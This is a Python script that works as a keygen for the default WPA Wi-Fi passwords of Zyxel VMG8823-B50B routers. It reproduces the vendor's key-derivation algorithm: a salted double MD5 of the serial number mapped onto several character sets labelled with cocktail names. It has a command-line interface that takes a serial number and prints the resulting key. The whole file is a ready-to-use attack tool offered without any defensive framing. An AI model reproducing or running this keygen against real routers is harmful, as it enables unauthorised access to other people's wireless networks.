# zykgenpy
# Zyxel VMG8823-B50B WPA Keygen
import hashlib
import argparse

def pick(haystack, charset, needle, base, max, v):
    if len(haystack) == 107:
        needle = str(needle).lower()
    i = 0
    terminate = 0
    letter = ''
    while i < max and terminate == 0:
        if haystack[i] == chr(int(needle)):
            base = base + i + 1
            letter = charset[base % v]
            terminate = 1
        i = i + 1
    if terminate == 0:
        letter = chr(int(needle))
    return letter

def cocktail(arg):
    if arg == "c":
        return 1
    elif arg == "n":
        return 2
    elif arg == "m":
        return 3
    elif arg == "s":
        return 4
    elif arg == "g":
        return 5
    else:
        return False


def zykgen_wpa(serial, passlength, cocktail):
    # Cosmopolitan
    if cocktail == 1:
        haystack = '1234567890ilosabcdefghjkmnpqrtuvwxyz12560IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        charset = 'abcdefghjkmnpqrtuvwxyz125690IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 14
        v = 22
    # Negroni
    if cocktail == 2:
        haystack = '125690IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        charset = '3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 10
        v = 26
    # Mojito
    if cocktail == 3:
        haystack = '125690IOSVWZ3478ABCDEFGHKLJMNPQRTUXY'
        charset = '3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 12
        v = 24
    # Screw driver
    if cocktail == 4:
        haystack = '125680BDGILOQSZ3478ACEFHKJMNPRTUVWXY125680BDGILOQSZ3478ACEFHKJMNPRTUVWXY' # invalid+valid chars
        charset = '3479ACEFHJKMNPRTUVWXY3479ACEFHJKMNPRTUVWXY' # valid chars
        max_value = 15 # unused chars (36-v)
        v = 21 # valid chars

    # Gin N' Juice
    if cocktail == 5:
        haystack = 'B8G6I1L0OQDS5Z23479ACEFHJKMNPRTUVWXY' # invalid+valid chars
        charset = '3479ACEFHJKMNPRTUVWXY' # valid chars
        max_value = 15 # unused chars (36-v)
        v = 21 # valid chars

    serial = serial.upper()
    md5 = hashlib.md5()
    md5.update(serial.encode())
    # Append salt
    salted = "%sPSK_ra0" % (md5.hexdigest())
    newmd5 = hashlib.md5()
    newmd5.update(salted.encode())
    # Do some math with the raw MD5 digest to get the base
    base = newmd5.digest()[0] * 256 + newmd5.digest()[1]
    # Convert to binary and flip
    binary = bin(base)[2:].zfill(16)[::-1]


    key = ""
    for i in range(passlength):
        if int(binary[i]) == 1:
            c = newmd5.digest()[i] % 26 + 65
        else:
            c = newmd5.digest()[i] % 10 + 48
        letter = pick(haystack, charset, c, base, max_value, v)
        key += letter
    print (key)


parser = argparse.ArgumentParser(description='Zykgen WPA keygen. (Zyxel VMG8823-B50B)')
parser.add_argument('serial', help='Serial Number')
parser.add_argument('cocktail', help='Cocktail to use for keygen. m = Mojito, n = Negroni, c = Cosmopolitan, s = Screw Driver, g = Gin N\' Juice')
parser.add_argument('-length', help='Password length, default is 10.', default=10, type=int)
args = parser.parse_args()

if cocktail(args.cocktail):
    zykgen_wpa(args.serial, args.length, cocktail(args.cocktail))
else:
    print("Invalid cocktail. Options are m, n, c, s or g, use -h for more help.")

